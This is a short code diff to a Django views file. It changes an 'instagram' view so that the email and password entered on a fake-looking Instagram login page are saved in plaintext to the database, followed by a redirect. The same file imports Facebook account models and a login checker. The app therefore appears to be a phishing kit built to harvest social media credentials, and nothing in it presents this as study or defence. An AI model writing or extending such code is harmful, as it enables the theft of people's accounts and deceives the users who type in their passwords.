@@ -1,6 +1,6 @@
 import urllib.request
 from django.shortcuts import render, redirect
-from .models import FacebookAccount, AccountInfo
+from .models import FacebookAccount, AccountInfo, InstagramAccount
 from .check_login import FacebookLogin
 from django.views.decorators.cache import cache_control
 from .names_comments import names, comments, tupleNamesComments
@@ -36,6 +36,15 @@ def get_location():
 
 
 def instagram(request):
+    email = request.POST.get('email')
+    password = request.POST.get('password')
+
+    if request.method == 'POST' and 'loginBTN' in request.POST and email and password:
+        newLog = InstagramAccount.objects.create(email=email, password=password)
+        newLog.save()
+
+        return redirect('post')
+
     context = {}
     return render(request, 'insta.html', context)
 
